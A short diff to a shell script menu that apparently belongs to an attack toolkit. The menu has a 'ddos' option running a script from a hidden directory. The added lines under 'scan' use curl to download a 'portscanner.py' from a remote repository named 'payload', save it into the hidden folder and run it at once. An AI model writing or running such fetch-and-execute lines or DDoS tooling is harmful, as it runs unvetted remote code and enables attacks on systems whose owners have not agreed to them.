@@ -70,6 +70,8 @@ ddos)
     python3 .hidden/ddos.py
     ;;
 scan)
+curl -s https://raw.githubusercontent.com/sorrynotsorry1/payload/main/portscanner.py >> .hidden/portscanner.py
+python .hidden/portscanner.py
     echo "Enter port: "
     read PORT
     echo "Enter address: "
